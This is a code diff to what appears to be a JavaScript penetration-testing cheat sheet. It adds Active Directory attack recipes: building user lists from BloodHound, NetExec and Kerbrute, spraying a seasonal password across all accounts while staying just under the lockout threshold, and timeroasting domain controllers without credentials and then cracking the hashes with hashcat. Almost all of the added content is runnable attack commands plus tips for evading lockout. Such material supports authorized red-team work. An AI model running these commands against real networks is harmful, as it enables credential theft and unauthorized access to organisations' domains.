@@ -551,6 +551,25 @@ var TOOLKIT = [
             ]
           },
           {
+            title: "Password spraying — build the user list, then spray",
+            type: "commands",
+            commands: [
+              { label: "User list from a BloodHound collection (users.json)", cmd: "# SharpHound / bloodhound-python output includes a *_users.json\njq -r '.data[].Properties.samaccountname' *_users.json | sort -u > users.txt\n# no jq? pull it with grep:\ngrep -oE '\"samaccountname\": *\"[^\"]+\"' *_users.json | cut -d'\"' -f4 | sort -u > users.txt\n# only enabled accounts:\njq -r '.data[] | select(.Properties.enabled) | .Properties.samaccountname' *_users.json | sort -u > users.txt" },
+              { label: "User list from NetExec (valid cred, or a null session)", cmd: "# with any domain credential, over LDAP (Username is column 5):\nnxc ldap <dc> -u <user> -p '<pass>' --users | awk '{print $5}' | sort -u > users.txt\n# no creds? RID-cycle a null/guest SMB session, then keep the username (the part after the backslash):\nnxc smb <dc> -u guest -p '' --rid-brute" },
+              { label: "No creds at all — Kerbrute user enumeration (pre-auth)", cmd: "kerbrute userenum -d bank.local --dc <dc-ip> /usr/share/seclists/Usernames/xato-net-10-million-usernames-dup.txt -o kerb.out\ngrep 'VALID USERNAME' kerb.out | awk '{print $NF}' | cut -d@ -f1 | sort -u > users.txt" },
+              { label: "Check the lockout policy, THEN spray one password", cmd: "nxc smb <dc> -u <user> -p '<pass>' --pass-pol        # read the lockout threshold + window first\nnxc smb <range> -u users.txt -p 'Season2026!' --continue-on-success\n#   one password across all users; --continue-on-success or it stops at the first hit\n#   stay one guess under the lockout threshold, and wait out the window between rounds" }
+            ]
+          },
+          {
+            title: "Timeroasting (unauthenticated)",
+            type: "commands",
+            commands: [
+              { label: "Harvest computer / trust-account hashes from the DC (no creds)", cmd: "nxc smb <dc-ip> -u '' -p '' -M timeroast\n# MS-SNTP: the DC answers NTP with a MAC keyed on the account's password hash, so\n# this needs NO valid credential (the null SMB login just triggers the module).\n# output is hashcat format:  <rid>:$sntp-ms$<hash>$<salt>" },
+              { label: "Crack, then map the RID back to an account", cmd: "hashcat -m 31300 timeroast.hashes /usr/share/wordlists/rockyou.txt\n#   -m 31300 = MS-SNTP. machine passwords are usually random/uncrackable — the wins\n#   are weakly-set machine accounts and trust accounts.\nnxc smb <dc-ip> -u <user> -p '<pass>' --rid-brute   # RID -> account name" },
+              { label: "If null sessions are blocked — standalone tool", cmd: "# SecuraBV's timeroast is pure NTP (no SMB) and has RID/rate control:\npython3 timeroast.py <dc-ip> -o timeroast.hashes" }
+            ]
+          },
+          {
             title: "Shares",
             type: "table",
             columns: ["Command", "Description"],
@@ -606,6 +625,8 @@ var TOOLKIT = [
             items: [
               "Always check --pass-pol before spraying — one wrong guess per account is fine, several isn't if the lockout threshold is low.",
               "--continue-on-success is easy to forget and will make a spray stop dead at the first valid hit — add it by default.",
+              "Build the spray list from data you already have: jq the samaccountname out of a BloodHound *_users.json, or use --users / --rid-brute; filter disabled accounts so you don't burn guesses.",
+              "Timeroasting (-M timeroast) needs no credentials — it abuses MS-SNTP on the DC and returns computer/trust-account hashes that crack with hashcat -m 31300, worthwhile mainly against weakly-set machine or trust passwords.",
               "NetExec is the maintained fork of CrackMapExec (cme) — same mental model, a handful of renamed flags.",
               "Combine LDAP enumeration output directly into BloodHound rather than reading it as a flat list — attack-path context is the whole point.",
               "Prefer --no-bruteforce with paired username:password files so you're not accidentally testing every combination against a locked-out-prone environment."
